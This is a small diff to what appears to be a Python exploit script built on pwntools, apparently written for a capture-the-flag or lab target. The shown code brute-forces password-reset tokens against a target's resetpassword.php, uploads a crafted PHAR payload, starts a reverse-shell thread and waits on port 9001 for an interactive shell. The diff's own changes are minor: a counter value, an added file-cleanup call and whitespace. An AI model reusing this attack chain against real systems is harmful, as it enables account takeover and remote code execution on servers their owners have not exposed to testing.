@@ -52,7 +52,7 @@ def generateTokens():
 def bruteforceToken(target):
     p1 = log.progress("")
     url = "http://%s/resetpassword.php" % target
-    counter = 0
+    counter = 1
     with open('tokens.txt', 'r') as f:
         for token in f:
             token = token.strip()
@@ -214,6 +214,7 @@ if __name__ == '__main__':
     appendPayload(bytesObj)
     file_content = readFile()
     uploadPhar(args.target,session,file_content)
+    removeFileExisting()
     threading.Thread(target=reverseShell, args=(args.target,)).start()
-    shell = listen(9001, timeout=20).wait_for_connection()
+    shell = listen(9001,timeout=20).wait_for_connection()
     shell.interactive()
